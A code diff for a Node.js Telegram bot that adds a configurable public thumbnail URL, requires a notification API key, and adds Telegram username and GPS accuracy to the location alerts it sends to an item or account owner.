@@ -17,9 +17,12 @@ const BASE_URL = process.env.BASE_URL;
 const BOT_API_PORT = process.env.BOT_API_PORT || 5000;
 const NOTIFY_API_KEY = process.env.NOTIFY_API_KEY;
 const VPS_IP = process.env.VPS_IP;
+const BOT_PUBLIC_URL =
+    process.env.BOT_PUBLIC_URL ||
+    (VPS_IP ? `http://${VPS_IP}:${BOT_API_PORT}` : `http://localhost:${BOT_API_PORT}`);
 
-if (!BOT_TOKEN || !BASE_URL) {
-    console.error('Missing BOT_TOKEN or BASE_URL in .env');
+if (!BOT_TOKEN || !BASE_URL || !NOTIFY_API_KEY) {
+    console.error('Missing BOT_TOKEN, BASE_URL, or NOTIFY_API_KEY in .env');
     process.exit(1);
 }
 
@@ -179,7 +182,7 @@ bot.on('photo', async (msg) => {
             telegramUsername: session.telegramUsername,
             ownerChatId: chatId,
             thumbnail:
-                `http://${VPS_IP}:5000/uploads/${filename}`,
+                `${BOT_PUBLIC_URL}/uploads/${filename}`,
             createdAt: new Date().toISOString()
         });
 
@@ -239,8 +242,10 @@ app.post('/notify', async (req, res) => {
         const {
             ownerChatId,
             ownerName,
+            telegramUsername,
             latitude,
-            longitude
+            longitude,
+            accuracy
         } = req.body;
 
         const mapLink =
@@ -249,18 +254,22 @@ app.post('/notify', async (req, res) => {
         console.log('========================');
         console.log('📍 LOCATION ALERT');
         console.log('Owner:', ownerName);
+        console.log('Telegram:', telegramUsername || 'No username');
         console.log('Latitude:', latitude);
         console.log('Longitude:', longitude);
+        console.log('Accuracy:', accuracy ? `${Math.round(accuracy)}m` : 'Unknown');
         console.log('Map:', mapLink);
         console.log('========================');
 
         const message = `
-🚨 Location Captured
+Location captured
 
 Owner: ${ownerName}
+Telegram: ${telegramUsername || 'No username'}
 
 Latitude: ${latitude}
 Longitude: ${longitude}
+Accuracy: ${accuracy ? `${Math.round(accuracy)} meters` : 'Unknown'}
 
 Map:
 ${mapLink}
